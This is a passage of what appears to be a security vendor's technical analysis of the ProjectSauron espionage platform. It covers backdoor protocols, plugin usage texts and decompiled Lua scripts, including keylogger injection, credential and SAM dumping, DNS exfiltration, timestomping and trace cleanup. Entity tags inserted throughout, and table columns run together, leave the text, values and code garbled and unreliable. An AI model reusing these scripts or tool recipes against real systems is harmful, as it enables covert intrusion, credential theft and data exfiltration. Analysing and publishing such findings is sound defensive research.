[ORG] C&C server , up to [CARDINAL] 31 such entries . It uses the default system [ORG] User - Agent string or a default fallback value : \u201c [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; Win32 ) \u201d . It also sends the following HTTP additional headers : Accept : text / html , text / plain,*/ * Accept - Language : en - us Accept - Charset : ISO-8859 - 1 , * Keep - Alive : [CARDINAL] 300 Connection : Keep - Alive Cache [ORG] - Control : No - CacheIf proxy parameters are set , it uses them for sending the request . Sends a HTTP GET request to a given URL using Wininet API . The payload is extracted from the response using the \u201c Start Mark \u201d and \u201c End Mark \u201d strings , and then Base64 - decoded . Generic pipe backdoorsA set of executables that are usually delivered over the local network using legitimate remote administration tools from other compromised computers . Samples : [GPE] MD5SizeFormat BitsLinkerCompilation Windows executables . When started without parameters , the module copies itself to the % TEMP% directory and schedules the execution of its copy with parameter \u201c -q \u201d by creating a new scheduler task . When run with [CARDINAL] one parameter , the module proceeds with its actions . It sets up a hardcoded [QUANTITY] 64 [QUANTITY] - byte RC4 key , connects to a remote peer using a hardcoded [ORG] IP address ( local or external ) and hardcoded port ( different for each sample ) . Then it sends encrypted packet of [CARDINAL] 0x10 bytes starting with magic numbers , and expects to receive a payload in specific format , starting with magic numbers as well . If the payload is successfully received from the server , it is called by the provided entry point offset . The shellcode is provided with pointers to API functions \u201c GetProcAddress \u201d and \u201c LoadLibraryA \u201d and the handle of values provided from the command line , and it does not copy itself or schedule a job , it just runs in place , timestamp2013.01.04 05:33:212015.02.24 09:46:022015.02.24 09:46:022015.08.25 10:20:402015.10.01 18:04:262015.12.14 15:06:11The package is wrapped in a [ORG] PE module that activates the standard blob . It usually contains the binary and the configuration file . The configuration file contains : the pipe name , the [DATE] 2048 - bit [ORG] RSA public key and exponent . The module [ HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters ] NullSessionPipesprovidedcreatespipeusinganameanamedintheconfig : If the values does not contain the name of the pipe provided in the config , it appends it to the list and updates the registry value . Then it creates the pipe \\\\.\\PIPE\\%pipe_name% and waits for incoming connections on the pipe . Once an incoming connection is accepted , it performs a key exchange based on the [ORG] RSA key provided by the configuration , and using [CARDINAL] two hardcoded [QUANTITY] 16 [QUANTITY] - byte \u201c magic \u201d strings as challenge - response markers . After the timestamp2009.07.13 23:31:132009.07.13 23:31:132009.07.13 23:31:132009.07.13 23:31:132009.07.14 01:03:452009.07.14 01:24:442009.07.14 01:24:442009.07.14 01:24:442009.07.14 01:24:44This module employs a different kind of encryption by using a custom virtual machine for decrypting its payload . The final artefact of decryption is a standard blob that is then started as usual . The configuration data in the shellcode is also stored in a unique format of several encrypted records . The blob contains the actual [PERSON] Trojan component . The configuration blob consists of [CARDINAL] two records : the [ORDINAL] first one is the actual config data including the C2 URL , and the [ORDINAL] second is another standard blob that has a special deinstallation library and its own configuration data inside . The configuration contains the following data:0x1010x1020x301RSA keyExponentFormat string for a file name . Its default value is \" [WORK_OF_ART] C:\\System [WORK_OF_ART] Volume [WORK_OF_ART] Information\\%VID% \" , where [ORG] the \" [ORG] % VID% \" part is then replaced by a [ORG] GUID - like representation of the parts of the RSA key.0x8280 \u2013 [CARDINAL] 0x9000 ( step 0x100)C&C URL configurationFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 8 of 33The ProjectSauron APT . Technical analysisThe module collects basic information about the system and sends [ORG] HTTP [ORG] POST requests to [CARDINAL] one of the [ORG] C&C servers specified in the configuration blob . The encrypted response from the server should contain a valid PE DLL file that has an exported function called \u201c init \u201d . Once such response is received , the module calls the exported function . The deinstallation [ORG] DLL is accompanied by its own configuration file listing the files to be deleted:0x101 , 0x102 Names of event objects to wait for0x1030x201+Guid - like filename ( see 0x301 in the previous description ) to be deletedLocations of files to deleteCore platform ( LUA VFS)Samples : [GPE] MD5SizeFormat BitsLinkerCompilation backdoor module . The [ORG] DLL versions provide the similar interface mimicking an [ORG] LSA password filter , or as a Security Provider . It decrypts the standard blob that consists of [CARDINAL] two parts : the orchestrator binary and the configuration blob . The configuration blob is a virtual filesystem that contains all binary plugins required for executing a particular task . It may include other standard blobs containing other execution scripts . The last item of the [ORG] VFS is always a precompiled Lua script that instructs the core what to do . The [ORG] VFS is encrypted with RC4 or [PERSON] Salsa20 ( depending on the version of the platform ) and compressed with [ORG] Zlib . The orchestrator executes the Lua script using embedded runtime and provides basic functions to the script . The original Lua interpreter was modified : the version embedded in the platform uses unicode ( utf-16 ) encoding for storing string values and variable names . The execution flow is controlled by the script . External plugins are [ORG] DLL libraries , they are referenced by name . The provided interface emulates console applications : they have emulated stdin / stdout / stderr , the input data is provided as command - line parameters and input streams . Output can be chained by a standard shell operator \u201c | \u201d to be fed into another program . Overall flow looks like a shell script . The \u201c exec \u201d and \u201c exec2str \u201d commands support basic redirection operators ( \u201c > \u201d , \u201c > > \u201d , \u201c < \u201d , \u201c |\u201d).Modules provided by the Lua runtime : table [ORG] wAll the modules except \u201c w \u201d are standard for LUA . The module \u201c w \u201d is custom , it implements the following specific commands : argscdcreate_logdebugfdrop_tokenexecexec2strexitfrontendget_idGet the argumentsChange current directoryInitialize a new encrypted log object ( on disk or in memory)Call OutputDebugStringW()Close handle to some objectExecute a plugin , results are stored in the [GPE] logExecute a plugin , return the result as stringStop executionReturn the value of an internal variableReturn the value of an internal variableFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 10 of [CARDINAL] 33The ProjectSauron APT . Technical analysisget_mem_logget_log_infoget_proc_bitsGet the contents of the current in - memory log storageGet the status of the current log storageReturn hardcoded value ( [CARDINAL] 32 , [CARDINAL] 64)get_windows_bitsReturn whether OS is [QUANTITY] 32 [QUANTITY] - bit or [CARDINAL] 64 - bitload_statemessageboxprintfpwdrandgenrandstrrandrangesave_stateLoad execution state from a file or from the registryShow a standard message boxWrite to the emulated stdout streamReturn the current working directoryReturn a buffer full of random dataReturn a random alphanumeric stringReturn a random value that is bound by a given rangeSave execution state in a file or from the registryshutdown_detectedReturn 1 if the OS is shutting downSet internal parameter 's value by nameDelayAttach to the encrypted log storageDetach from the current encrypted log storagesetsleepstart_logstop_logPluginsThe rest of the functionality is provided by the plugins . Most of the plugins contain a full description of its purpose and available command line keys that can be printed if no parameters were specified , or if requested by using a \u201c / ? \u201d , \u201c - ? \u201d , \u201c /h \u201d command line parameter . These descriptions ( if present ) are presented as - is . [ORG] VFS [ORG] namearppingattribDescription ( original , when present)ARP scanner -r [PERSON] Resolve hosts that answer . -l Print only replying [ORG] Ips . -m Do not display [ORG] MAC addresses . Displays or changes file attributes [PERSON] ATTRIB [ /S][+R | -R ] [ + A | -A ] [ + S | -S ] [ + H | -H ] [ drive:][path ] + Sets an attribute . - Clears an attribute . R Read - only file attribute . A [ORG] Archive file attribute . S System file attribute . For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 11 of [CARDINAL] 33The ProjectSauron APT . Technical analysisbasexblobcatcopydeldetachdextH [GPE] Hidden file attribute . [ drive:][path]<filename > Specifies a file or files for attrib to process . /S Processes matching files in the current folder and all subfolders . Base [CARDINAL] 64/32/16 en / de - coder [ -b < base > ] [ -d [ -f ] ] [ -h ] Options : -b base [DATE] 64 , [DATE] 64url , [DATE] 32 , [CARDINAL] 32url or [CARDINAL] 16 . Default is [DATE] 64 -d [NORP] Decode data . Default is to encode -f Force decoding when input is invalid / corrupt -h This cruft Uses standard in / out . See man page for examples . Additional blob that should be decoded and loaded , usually contains another copy of the orchestrator and its own VFSDisplays the contents of file(s ) cat [ options ] { file(s ) | - | @- Options : -b < lines > Display only the [ORDINAL] first < lines > lines ( head ) . Can not be used with -t option . -t < lines [PERSON] > [PERSON] Display only the last < lines > lines ( tail ) . Can not be used with -b option . -e Display $ at end of each line . -n Number all output lines . -N Print a header containing the file name . -F Print full path in header . -s Never [CARDINAL] more [CARDINAL] than [CARDINAL] one single blank line . -f Follow output . With no [ORG] FILE , or when [ORG] FILE is - , read standard input . If the - is prepended with a @ , stdin is a list of files . Copy files or directories on diskDelete files or directoriesRun blobs in the background Usage : list [PERSON] Show running blobs start < file > [ [ pid / name ] [ \" args \" ] ] Start running a blob stop < i d > Stop a running blob wait < i d > < timeout > Wait for a blob to finishDNS [ORG] Exfil [ORG] Tool [ORG] -a [ORG] Assemble rows of [ORG] DNS names back to a single string of data -f Force - removes checks of [ORG] DNS names and lengths ( during split)For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 12 of [CARDINAL] 33The ProjectSauron APT . Technical analysisdinstdirand missing / wrapped data ( during assembly ) -l length Specify length of data part of suffix ( default and max is % d ) -r Randomize data lengths ( length/2 to length ) -h This cruft Suffix format : domain.com See man page for examples . Takes the input string on the stdin stream and generates a sequence of subdomain names to be resolved for actual exfiltration . The list is written to the stdout stream . The [ORG] DNS resolution is expected to be performed by another tool . Display installed applications Options : -v Display additional information . -p Display product patches . Displays files and subdirectories dir [ options ] [ drive:][path][filename ] Options : -A[-]x Displays files with specified attributes . attribs [ORG] D [ORG] Directories [ORG] R Read [ORG] - [ORG] only files [LOC] H [LOC] Hidden files A [PERSON] Files ready for archiving S System files P Reparse points E Encrypted files - Prefix meaning not -B Uses bare format ( no heading information or summary ) . -E Checks that specified paths exists ( disables pattern matching ) -F Force display of full path . -C Do not display the thousand separator in file sizes . -O[-]x List by files in sorted order . orders [ORG] N [ORG] By name ( alphabetic ) S By size ( smallest [ORDINAL] first ) E By extension ( alphabetic ) D By date / time ( oldest first ) [ORG] G [ORG] Group directories [PERSON] first [PERSON] - [PERSON] Prefix to reverse order -S Recursive directory listing . -Tx Controls which time field displayed or used for sorting . fields [ORG] C [ORG] Creation A Last Accessed M Last Modified -X Use the short names generated for non-8dot3 file names . If no short name is present the normal name is displayed . -da < DATE > Only show files later than < DATE > -db < DATE > Only show files earlier than < DATE > Date is in [GPE] YYYYMMDDHHMM -za < SIZE > Only shows files bigger than or equal to < SIZE > -zb < SIZE > Only shows files smaller than or equal to < SIZE > You can use K / M / [ORG] G as in 20KFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 13 of [CARDINAL] 33The ProjectSauron APT . Technical analysisdroopemaildftimeget2grepAdditional blob containing [CARDINAL] one [ORG] DLL file \u2013 downloader When activated , the library downloads a file using a hardcoded URL using a 2048 - bit key . If the decrypted blob matches the format of a standard blob , it is then executed . Dump stored email accounts The plugin displays settings for applications that uses [ORG] Microsoft Internet Account Manager . This includes Outlook and Outlook Express , but also an unknown number of [ORDINAL] third party applications . [PERSON] Display or copy file time [ -E ] [ -c file ] file Options : -E Exclude the [ORG] PE header time stamp . -c Copy file time from the specified file to the target . This plugin is used to tailor each installed executable file to the environment , modifying the filesystem and [ORG] PE format timestamps to be equal to the corresponding values of legitimate files , i.e. \u201c ntdll.dll \u201d or \u201c svchost.exe \u201d . This prevents fast discovery of malicious files during forensic analysis . Get files using file api Usage : [ options ] < files > Options : -r Recurse subdirectories -a Abort on failure ( file not found , [DATE] etc)Search for pattern in files [ options ] < regexp > [ file | @file ] Indata types : -U Indata is [ORG] UNICODE ( default is auto - detect ) -u Indata is [ORG] ASCII [ORG] -b [ORG] Indata is binary [ORG] Regexp interpretation : -i Ignore case distinctions Miscellaneous : -s Suppress error messages -v Select non - matching lines -I Ignore binary files Output control : -N < NUM > Read only [ORG] NUM lines in each file -m < NUM > Stop after [ORG] NUM matches -n Print line number with output lines -h Suppress the prefixing filename on output -L Only print [ORG] FILE names containing no match -l Only print [ORG] FILE names containing matches -c Only print a count of matching lines per FILEFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 14 of [CARDINAL] 33The ProjectSauron APT . Technical analysis - p Only print the match ( or submatch if used ) of matching lines Context control : -B < NUM > Print NUM lines of leading context -A < NUM > Print NUM lines of trailing context -C < NUM > Print NUM lines of output context With no [ORG] FILE , or when [ORG] FILE is - , read standard input . When [ORG] FILE is @[file ] , read file [ORG] NAMES from [ file ] . When [ORG] FILE is @- , read file [ORG] NAMES from standard input . [CARDINAL] Two - way [ORG] C&C communication transportCheck for injection detecting Options : -v Enable verbose output This plugin detects active drivers of many security products . Contains string \u201c i bootleg \u201d as part of the version string . Uses a local privilege escalation exploit . ( \u201c kern read\u201d)Inject a plugin into another process [PERSON] Blob - wrapped package of the \u201c kblog \u201d pluginKeyloggerKeylogger -p proc Inject using process name or pid . Default \" explorer.exe \" . -c file [PERSON] Convert mode : Read log from file and convert to text . -t sec Maximum running time in [TIME] seconds -v Verbose mode - ? Displays this usage information . [ORG] RSA-2048 key used by the plugin \u201c [ORG] npexfil\u201dKernel [ORG] Gate [ORG] Drops and executes vulnerable Outpost [PERSON] Sandbox driver ( [CARDINAL] 32 bit , v. [CARDINAL] 02.02.0597 from 2008 ) or avast ! Virtualization driver ( [CARDINAL] 64 bit , v. [CARDINAL] 9.0.2006.159 ) to gain kernel mode execution and load own driver ( knatt)Network packet filtering and modification driverDump [ORG] LSA secretsCreate a directory on diskRenames a file or directoryilpsendinjchkinjectkb64 , xkgateknatt.syslsadumpmkdirmoveFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 15 of [CARDINAL] 33The ProjectSauron APT . Technical analysismove move [ options ] [ drive:][path]<source name > [ drive:][path]<destination -O Overwrite existing file ( not directory ) . Note ! When source and destination is on different drives , move may fail . In such cases use copy and del.mytrampoline.blobShadow filesystem exfiltration toolnetnfonetxnpbd64npclient2 , npexfilnsluDump network information -i Dump interface information . -r Dump routing table . -a Dump ARP cache . -c Dump active network connections . -n Dump DNS cache . -A Dump all information . Displays open ports [ -u ] [ -t ] [ -f ] Options : -u Display open [ORG] UDP ports . -t Display open [ORG] TCP ports . -f Display full path to application ( default : only show filename ) -I Ignore rootkit alert . Default is both [ORG] TCP and [ORG] UDP ports . [PERSON] Blob containing a \u201c NullSessionPipes backdoor \u201d and its configuration Tool for exfiltrating data to a remote serverMini [ORG] DNS name / address lookup [ options ] < address / name [WORK_OF_ART] > [WORK_OF_ART] Options : [WORK_OF_ART] -s < name > Send the query to the given server . -t < type > Query type ( default is to detect , either A or [ORG] PTR ) . -T List supported query type . -c Force use of [ORG] TCP for the query . -r Disallow recursive queries . -n Disallow use of [GPE] NetBT for resolution . -l Use local cache only . -b Bypass any locally cached names . Use - instead of < address / name > to read addresses / names from stdin . This plugin may be chained with the \u201c dext \u201d plugin to implement a [ORG] DNS exfiltration [PERSON] channel.onpusher.blob\u201cOnline [PERSON] Push v2\u201dFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 16 of [CARDINAL] 33The ProjectSauron APT . Technical analysisBlob containing the plugin \u201c npclient2 \u201d , controlling script and other dependencies for data exfiltration . The script looks for the data collected with the \u201c mytrampoline \u201d plugin from the shadow filesystem and pushes it to a remote storage ( \u201c vault\u201d).Ping or traceroute a remote host -r Set mode to [LOC] Traceroute ( default : ICMP ping ) -a [PERSON] Resolve addresses to hostnames -d delay [PERSON] Delay in milliseconds between pings ( default : [CARDINAL] 1000 ms ) -w timeout Timeout in milliseconds for each reply ( default : [CARDINAL] 4000 ms ) -f Set do n't fragment flag ( to check MTU ) -i ttl Specify Time To Live value ( default : [CARDINAL] 128 ) -l size Send buffer size ( default : [CARDINAL] 32 bytes ) -n count Number of echo requests to send ( default : [CARDINAL] 1 ) -t Ping the specified host until stopped -u Only show [ORG] IP - number of hosts that reply -s Only show [ORG] IP - number of hosts that does not replyTerminate process(es ) pkill pkill [ -a ] < pid|name > Print process list plist plist [ mode ] [ options ] Modes : ( default is to show \" visible \" processes ) -p { pid } Find process using [ORG] PID -x Search for hidden processes -s { sid } Filter process using [ORG] Session [ORG] ID [ORG] Options -a All details -b Use bare format ( less formatting / spaces ) -l All details except modules list -n { string } Search substring in process name and command - line -f { string } Search substring in process filename ( full - path ) -S Show Session ID columnDump protected storage -p < pid > Specify process to inject into ( default is winlogon.exe ) . -l Do not load unloaded registry hives . Put files from file api Usage : [ options ] < source > [ dest]Return the list of currently active [DATE] processespingpkillplistpstorediput2pviewFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 17 of [CARDINAL] 33The ProjectSauron APT . Technical analysisrbswapregeditsamdumpscSchedule / List / Cancel pending file moves [ -o ] { source } [ destination ] Options : h - This help [PERSON] l [PERSON] - [PERSON] List files scheduled for moving d - Cancel the specified sheduled move o - Overwrite existing file If no destination is specified the source file will be deleted at the next reboot ( instead of moved).Command line registry editor [PERSON] Usage : [ options ] [ key1 ] [ key2 ] Options : -i Import settings from stdin Note that the input must be on .reg format ! -a Verbose display of values ( human readable ) . -r Display on the .reg format . -s Traverse subdirectories as well . -l Load all unloaded user registry hives . [ key ] If key(s ) are specified those will be displayed , otherwise a regedit \" shell \" is started . Dump the SAM database -n Do not include password history . Service controller [ -s server ] < command > [ command specific args ] Global options : -s Specify server name ( default localhost ) Commands : list [PERSON] List services . query Dump information about a service . start Start a service . stop Stop a service . pause Pause a service . continue Make a paused service resume execution . create Create a new service . config Change configuration for a service . delete [ORG] Delete a service . desc Change the description of a service . To get help for a specific command use : % s { command } -hsinfoSystem information sinfo Usage : sinfo [ -a]For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 18 of 33The ProjectSauron APT . Technical analysisskipslsmtpsend - a Show volume information for all drives ( removable , network etc ) . Warning , use this option with care since it causes cdrom - spinup , little network traffic and floppy - noise [ORG] Filter the input lines from stdout and print only those that contain ( or do not contain , depending on the command line switches ) the particular substringPort scanner with [ORG] TCP / [ORG] UDP / [ORG] ICMP support [ -tu < n>[,<n>-<n > ] ] IP[,IP - IP ] ( use a single ' - ' character to read ip 's from stdin ) - ? - Shows this help text -b - Get port banners -c - Timeout for [ORG] TCP and [ORG] UDP attempts ( ms ) . Default is [CARDINAL] 4000 -d - Delay between host scans ( ms ) . Default is [CARDINAL] 0 -D - Delay between port scans ( ms ) . Default is 0 [PERSON] -g [PERSON] - [PERSON] Bind to given local port -h - Hide results for systems with no open ports -i - Just list responding hosts ( [ORG] IP addresses only ) -j - Do n't output \" ----- \" separator between IPs -m - Bind to given local interface [ORG] IP -M - When pinging , use Windows builtin lib ( icmp.dll ) ( default on [ORG] Vista ) -n - No port scanning - only pinging -p - Do not ping hosts before scanning -P - Print partial results -q - Timeout for pings ( ms ) . Default is [DATE] 2000 [PERSON] -r [PERSON] - [PERSON] Resolve [PERSON] IP addresses to hostnames -t - TCP port(s ) to scan ( a comma separated list of ports / ranges ) -T - Use internal list of [ORG] TCP ports -u - UDP port(s ) to scan ( a comma separated list of ports / ranges ) -U - Use internal list of [ORG] UDP ports -v - Verbose mode -V - Very Verbose [PERSON] mode [PERSON] -z [PERSON] - [PERSON] Randomize [PERSON] IP and port scan order -Z - Randomize source port instead of letting the OS select it . The randomization range is set to [CARDINAL] 2k [CARDINAL] - [CARDINAL] > 32k [NORP] Scan TCP ports [CARDINAL] 80 , [CARDINAL] 100 , [CARDINAL] 101 [CARDINAL] 200 and [CARDINAL] 443 on all [ORG] IP banners from those ports and hiding hosts that had no open ports . SMTP client [ -v ] [ -p < port > ] [ -w < timeout > ] [ -f < nbr > ] [ -H < host > ] [ -A < header > ] < server > < from > < to > [ < body > ] Options : For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 19 of [CARDINAL] 33The ProjectSauron APT . Technical analysis - v Enable verbose output . Use multiple times for even more verbose output . -p Connect to server on < port > . Default port is [DATE] 25 . -w Number of ms to wait before aborting if server does n't respond . Default : [TIME] 10 [TIME] minutes . -f Try to send [ORG] HELO : s multiple times , if the server rejects the previous [ORG] HELO : s. [PERSON] Default is to fail if the [ORDINAL] first is rejected . -H Claim to be the host < host > in the [ORG] HELO handshake . Default : localhost . -A Append < header > as a header - row in the mail . Use multiple times if needed . < server > The dns - name or ip - address of the smtp - server . < from > The senders e - mail address . < to > The recipients e - mail address . < body > The file containing the actual e - mail . This file is read using the file - api . No processing is done on the data , so please make sure the line endings are the propper CRLF etc . If this argument is omitted , the e - mail is read from stdin . In this case , the body is assumed to be utf-16 and is converted to utf-8.Change user context Options : [ -u user ] [ -p password ] [ -x hash ] [ -i ] [ -t process ] -t Take user context from process ( name or pid ) -i Specify interactive logon ( default network ) -x Specify hash for logon ( NT - hash of password ) -p Specify password for logon -u Specify user name for logonElevate privileges to a system account and inject a blob in a running system process . Elevate privileges to execute in the SYSTEM context Pre - packaged core platform with a script ready for installation in a target systemGet OS version information , computer name , processor architecture , machine role and OS edition ( domain controller , workstation , compute cluster , datacenter , terminal server , storage server , small business , home server , etc . ) Pre - packaged core platform with a script tasked for removing all the traces of the malicious components in the systemDump user list -f < pattern > Display only users where the name matches < pattern > . -s < server > Display users on < server > . Default is localhost.susudetachsuxsymnet32unameuninstdllusersFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 20 of [CARDINAL] 33The ProjectSauron APT . Technical analysisw3getwdogiDownload and upload files using HTTP(S ) -v Be verbose . -s Print downloaded data to stdout . Can be used in combination with -f , to save a copy as well . If this flag is used , everything else is sent to stderr . -f < file > Specify local file . -r < file > Specify file to post to server . -c < chunk size [ORG] > [ORG] Post argument to server . -C Allow w3get to send and receive cookies . ( Default disable ) -R Allow w3get to follow http redirections . ( Default disable ) -o Overwrite existing file . -k < key>=<value > Specify a key = value pair to post to server . -p < argument [ORG] > [ORG] Post argument to server . -d Direct connection to server , ignores proxy settings . -g < ip : port > Use this proxy instead of user 's proxy settings . Basic backdoor < options > [ hostname port ] Options : -l listen mode ( default connect mode ) -p < port > local source port for listen / connect -s < ip > local source ip for listen / connect -d < delay > delay a number of [TIME] seconds before starting -I < process > run injected in process ( pid or name ) -x < handle > use socket identified by handle -y < process > process to use socket from ( default own ) -f force injection even if protection detected -u port reuse : allow listen on a busy port -a < ip > accept connections from ip address only -A < port > accept connections from source port only -t < seconds > accept timeout -j listen / connect from injected process The network communication component of the plugin is similar to the one implemented in the NullSessionPipes backdoor . However , the symmetric encryption algorithm used is RC6 combined with [ORG] RSA for key exchange . The response from the server is checked against an [QUANTITY] 8 [QUANTITY] - byte magic string . The payload from the remote peer is expected to be a JCalg1 - compressed [ORG] DLL . It is loaded and started by the plugin . This plugin is found in many configurations of the core platforms , in many cases this is the only plugin that is activated by the script . The hostname used is usually a local [ORG] IP address ( i.e. a domain controller in the compromised network).For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 21 of [CARDINAL] 33The ProjectSauron APT . Technical analysisweddllwfwwhoamiwinstPassive sniffer backdoor ready for installation in the target systemWindows [ORG] FireWall controller { command|-h } [ options ] -h - Show this help text status - Show Firewall Status enable - Enable Firewall disable [ORG] - [ORG] Disable [ORG] Firewall appadd { FullPath } { FriendlyName } { IPMask } - Add an application appdel { FullPath } - Remove an application portadd { PortNr } { TCP|UDP } { FriendlyName } { IPMask } - Add a port portdel { PortNr } { TCP|UDP } - Remove a port Example 1 : [PERSON] Add [PERSON] Messenger accepting connections from any ip address appadd \" [PERCENT] % [PERCENT] % ProgramFiles%%\\Messenger\\msmsgs.exe \" \" [WORK_OF_ART] Windows [WORK_OF_ART] Messenger \" \" * \" -a Display all available information . -n Do not resolve SIDs to names . Wedding [ORG] DLL installer ( [ORG] DLL installer ) Usage : launch [ -f ] [ -l ] [ -p process ] < dll > halt < dll | -e event > status < dll | -e event > install [ -c file ] < dll > uninstall [ -n ] < dll > install - Install the given [ORG] DLL uninstall - Uninstall the given [ORG] DLL launch - Inject and start the given [ORG] DLL halt - Stop the given [ORG] DLL status - Print some status for installed [ORG] DLL info - Show info about DLL Options : -p < process > Process to inject into ( name / pid , default depends on [ORG] DLL ) -e Specify event name ( default read from dll ) -f Launch even if [ORG] DLL not installed -l Start in loaded mode ( default injected mode ) -c Copy timestamps from given file -n Uninstall without haltingFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 22 of [CARDINAL] 33The ProjectSauron APT . Technical analysisAlthough the authors called it \u201c wedding [ORG] DLL installer \u201d and \u201c weddll \u201d is the name of the passive backdoor , they also used this plugin to install other malicious DLLs in the target systems . Secure Delete wipe Usage : wipe [ -f ] [ -s ] [ -q ] [ -d ] < file or directory > -s Recurse subdirectories -d Match directories as well as files ( for wildcard ) -f Force wiping of read - only files -q Do not ask for confirmation on multiple wipe To read a list of files from stdin , use - as file name . Encrypted data . The size and references in the Lua script indicate that it is most likely encrypted with RC6 using a [QUANTITY] 64 [QUANTITY] - bit key , and the key is stored on the [ORG] C&C server that activates the passive sniffer backdoor . Pipe and internet backdoor wrapped in an encryption layerwipewtcdllzeta2dllExamples of LUA scripts embedded in the Core platformThe LUA scripts presented were produced by the [CARDINAL] LuaDec decompiler modified to support the modifications of the LUA interpreter that is used in the platform . Minimal configuration , just launches the \u201c wdogi \u201d plugin to receive the actual payload from the nearest [WORK_OF_ART] Shield \u201d process is n\u2019t found , and then sets its file creation time equal to notepad.exe file : pview = w.exec2str(\"pview \" ) if string.find(pview , \" mcshield.exe \" ) = = nil then w.exec2str(\"winst install symnet32.dll \" ) [PERCENT] w.exec2str(\"ftime [PERCENT] -c [PERCENT] % WINDIR%\\\\notepad.exe [PERCENT] % windir%\\\\system32\\\\symnet32.dll \" ) endAnother small script , removes traces from the location where it supposedly was dropped , then waits for an incoming connection with a bigger payload or connect directly to the peer by the [ORG] IP address that is contained in the nearby files : get_path = function ( ) local t = w.exec2str(\"regedit -a \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\VirtualEncryptedNetwork\\\\Components\\ \" |grep - i [ snip ] \" ) local p = string.match(t , \" = \\\"([^\\\"]+)\\ \" \" ) if p then p = p \" \\\\ \" elseFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 23 of [CARDINAL] 33The ProjectSauron APT . Technical analysisp = \" \" cleanup = function(l_2_0 ) w.exec2str(\"move \\ \" \" l_2_0 \" FakeVirtualEncryptedNetwork.dll\\ \" \\ \" \" l_2_0 \" [CARDINAL] 0004.bak\\ \" \" ) w.exec2str(\"move \\ \" \" [WORK_OF_ART] l_2_0 \" FakeVirtualEncryptedNetwork.exe\\ \" [WORK_OF_ART] \\ \" \" l_2_0 \" 0005.bak\\ \" \" ) w.exec2str(\"rbswap \\ \" \" l_2_0 \" [CARDINAL] 0004.bak\\ \" \" ) w.exec2str(\"rbswap \\ \" \" l_2_0 \" 0005.bak\\ \" \" ) w.exec2str(\"del \\ \" \" l_2_0 \" [CARDINAL] 0004.bak\\ \" \" ) w.exec2str(\"del \\ \" \" l_2_0 \" 0005.bak\\ \" \" ) w.exec2str(\"del \\ \" \" l_2_0 \" [WORK_OF_ART] FakeVirtualEncryptedNetwork.cfg\\ \" \" ) exec = function(l_3_0 ) local c , l = nil , nil local d = w.exec2str(\"basex -b 16 < \\ \" \" l_3_0 \" [WORK_OF_ART] FakeVirtualEncryptedNetwork.cfg\\ \" \" ) w.exec2str(\"del \\ \" \" l_3_0 \" [WORK_OF_ART] FakeVirtualEncryptedNetwork.cfg\\ \" \" ) if string.len(d ) > = [CARDINAL] 12 then local t = string.sub(d , [CARDINAL] 1 , [CARDINAL] 8) local r = w.exec2str(\"cat \\ \" \" l_3_0 \" settings.cfg\\ \" | grep -i \" t ) local t = string.gsub(string.sub(r , [DATE] 11 , -1 ) , \" % c \" , \" \" ) local t = tonumber(string.sub(d , [DATE] 9 , [CARDINAL] 12 ) , [CARDINAL] 16 ) c = \" wdogi -f \" t \" \" t w.exec2str(c ) w.exec2str(c ) end if string.len(d ) > = [CARDINAL] 16 then local l = tonumber(string.sub(d , [DATE] 13 , [CARDINAL] 16 ) , [CARDINAL] 16 ) w.exec2str(\"wdogi -t 1200 -l -p \" l ) else w.exec2str(\"wdogi -t 1200 -l -p 5010 \" ) local p = get_path ( ) cleanup(p ) exec(p)Next , [CARDINAL] one script generates a new filename for collected keystrokes and injects keylogger module into the explorer.exe process : KBLOG_ROTATE_SECS = [DATE] 10800 tmp_dir = os.getenv(\"WINDIR \" ) \" \\\\temp\\\\ \" \" mISfx1q2Ef / QJPO4gi6DMKD5lxeQ380knDrULcZyTF5vFNWbUvT23PX9LrIdntHlkWAwjQQlfMXTogHW7fNklq / IsIk1dZljc9 / J3A8gS dD9f1hdLaiF3Qe8QPSiu / yHNmE3o0nkt0iyudRVMQKL4KtoV0TRy2o+XuN0+TYfnLWPkR11qk9pNAG1S9+qqhcD4eNWBkiwBJH1Zi HaJDBZ / KJSOTLoXqoFsS2f0Z+EeTe5+GCjKYDH7f2gkMsPA1z5LyP / PWnjxRoIubEtOfpMR7oDjKOcd9Y97XehAkmqnVW4r4Gbsk0hk [PERSON] jjRFZ / I7lO2eK8eE2mcSW+TRBMJBPEJEw==\"For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 24 of [CARDINAL] 33The ProjectSauron APT . Technical analysiscreate_log = function(l_1_0 , l_1_1 , l_1_2 , l_1_3 ) w.sleep(1000 ) t4 = w.randstr(\"1 \" , [CARDINAL] 5 ) f = l_1_0 t1 t2 t3 t4 \" .da \" res = w.start_log(\"file \" , f , \" new \" , true , l_1_1 , [PERSON] l_1_2 , l_1_3 ) log_rotate = function(l_2_0 , l_2_1 ) res = w.start_log(\"null \" ) new_filename = l_2_0 l_2_1 cmd = string.format(\"move \\\"%s\\ \" \\\"%s\\ \" \" , l_2_0 , [PERSON] new_filename ) w.exec(cmd ) w.printf(\"Entering main\\n \" ) w.set(\"flush - time \" , \" [DATE] 10s \" ) w.set(\"inj \" , true ) w.set(\"name \" , \" kblog - waiting for file and injection \" ) alist = w.exec2str(\"dir /a - d /b /F \" tmp_dir \" bka*.da \" ) if string.find(alist , \" bka \" ) then sep = \" \\r\\n \" for s in string.gmatch(alist , \" ( [ ^ \" sep \" ] + ) \" ) do w.exec2str(\"move \" s \" \" s \" t \" ) w.printf(\"Sleep before pview\\n \" ) w.sleep(5000 ) proc = w.exec2str(\"pview \" ) until 